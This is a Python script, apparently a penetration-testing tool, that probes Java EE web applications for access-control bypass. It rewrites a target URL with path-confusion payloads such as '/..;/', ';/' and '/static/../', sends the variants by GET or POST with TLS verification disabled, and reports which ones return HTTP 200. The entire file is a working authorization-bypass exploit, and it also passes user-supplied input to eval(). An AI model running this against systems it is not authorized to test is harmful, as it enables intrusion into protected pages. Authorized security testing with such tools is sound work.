# Author: kw0ng
# blog: https://kw0ng.top
import re,sys
import json
import ssl
import urllib.request

ssl._create_default_https_context = ssl._create_unverified_context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


class NoRedirHandler(urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return fp
    http_error_301 = http_error_302


class AccessControl:
    def __init__(self, url, method=None, data=None):
        self.url = url
        self.uri = self.AnalysisUri()
        self.host = self.AnalysisHost()
        self.method = method
        self.data = data
        # self.proxies = {
        #     "http": "http://127.0.0.1:8080",
        #     "https": "http://127.0.0.1:8080"
        # }
        self.proxies = {}
        self.whiteList = [
            "/", "/;/", ";/", "/;/../", "/java.css/../", "/java.js/../", "/java.jpg/../",
            "/java.ico/../", "/java.png/../", "/java.gif/../",
            "/java.css/..;/", "/java.js/..;/", "/java.jpg/..;/",
            "/java.ico/..;/", "/java.png/..;/", "/java.gif/..;/",
            "/login.html/../", "/login.html/..;/", "/res/../", "/res/..;/",
            "/static/../", "/static/..;/", "/css/../", "/css/..;/",
            "/images/../", "/images/..;/", "/themes/../", "/themes/..;/",
            "/userfiles/../", "/userfiles/..;/", "/js/../", "/js/..;/",
            "/rest/../", "/rest/..;/", "/api/../", "/api/..;/"
        ]


    def AnalysisUri(self):
        return re.search('[http,https]://.*?(/.*?)$', self.url).group(1)

    def AnalysisHost(self):
        return re.search('(.*?://.*?)/.*?$', self.url).group(1)

    def findSlash(self, uri):
        slashList = []
        uri = uri if uri[-1] != "/" else uri[:-1]
        for i in range(len(uri.split("?")[0])):
            if uri[i] == '/':
                slashList.append(i)
        return slashList

    def GeneratePayload(self, uri):
        resultList = []
        Slash = self.findSlash(uri)
        for i in self.whiteList:
            for index in Slash:
                if index == 0 and i == ";/":
                    continue
                uriPayload = uri[:index] + i + uri[index + 1:]
                resultList.append(uriPayload)
                # 有参数URI末尾 没有/
                if "?" in uri and uri.split("?")[0][-1] != "/":
                    # 切割URI和参数
                    uriPayload = uriPayload.split("?")
                    # 末尾加/
                    resultList.append(uriPayload[0] + "/?"+uriPayload[1])
                    # 末尾加;
                    resultList.append(uriPayload[0] + ";?"+uriPayload[1])
                # 没有有参数URI末尾 没有/
                elif "?" not in uri and uri.split("?")[0][-1] != "/":
                    # 末尾加/
                    resultList.append(uriPayload + "/")
                    # 末尾加;
                    resultList.append(uriPayload + ";")
        return set(resultList)

    def testTargetAsUrllibGet(self, url):
        proxySupport = urllib.request.ProxyHandler(self.proxies)
        # 禁止重定向 NoRedirHandler 方便识别302
        opener = urllib.request.build_opener(NoRedirHandler,proxySupport)
        urllib.request.install_opener(opener)
        try:
            response = urllib.request.urlopen(url)
            responseText = response.read().decode("utf8")
            responseStatusCode = response.status
            print(url,responseStatusCode)
            return responseStatusCode,responseText
        except:
            return 500,""
        

    def testTargetAsUrllibPost(self, url):
        proxySupport = urllib.request.ProxyHandler(self.proxies)
        opener = urllib.request.build_opener(proxySupport)
        urllib.request.install_opener(opener)
        try:
            if self.method == 'data':
                data = bytes(self.data, encoding='utf8')
                request = urllib.request.Request(url, data=data)
            else:
                headers = {"Content-Type": "application/json;charset=UTF-8"}
                data = json.dumps(eval(self.data))
                data = bytes(str(data), encoding='utf8')
                request = urllib.request.Request(url, headers=headers, data=data)
            response = urllib.request.urlopen(request)
            responseText = response.read().decode("utf8")
            responseStatusCode = response.status
            print(url,responseStatusCode)
            return responseStatusCode,responseText
        except:
            return 500,""

    def testTargetAsGet(self, urlList):
        try:
            responseList = []
            responseDict = {}
            for url in urlList:
                try:
                    responseStatusCode,responseText = self.testTargetAsUrllibGet(url)
                    if responseStatusCode == 200 and responseText not in responseList:
                        responseList.append(responseText)
                        responseDict[url] = responseText[:512]
                except Exception as e:
                    print(e)
            return responseDict
        except Exception as e:
            print(e)

    def testTargetAsPost(self, urlList):
        responseList = []
        responseDict = {}
        for url in urlList:
            try:
                responseStatusCode,responseText = self.testTargetAsUrllibPost(url)
                if responseStatusCode == 200 and responseText not in responseList:
                        responseList.append(responseText)
                        responseDict[url] = responseText[:512]
            except Exception as e:
                print(e)
        return responseDict

    def run(self):
        payloadList = self.GeneratePayload(self.uri)
        urlList = [self.host + i for i in payloadList]
        if self.method == None:
            resultDict = self.testTargetAsGet(urlList)
        else:
            resultDict = self.testTargetAsPost(urlList)
        if resultDict and len(resultDict) > 0:
            for key in resultDict:
                print(key)
                print(resultDict[key])

if __name__ == "__main__":
    # get
    if len(sys.argv[1:]) == 1:
        ac = AccessControl(sys.argv[1])
        ac.run()
    # post
    elif len(sys.argv[1:]) == 3:
        url = sys.argv[1]
        method = sys.argv[2]
        data = sys.argv[3]
        ac = AccessControl(url, method, data)
        ac.run()
    elif len(sys.argv[1:]) < 1:
        print(
            'python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index?id=1"'
        )
        print(
            'python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index" -data id=1'
        )
        print(
            '''python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index" -data-json '{"id":1}' '''
        )
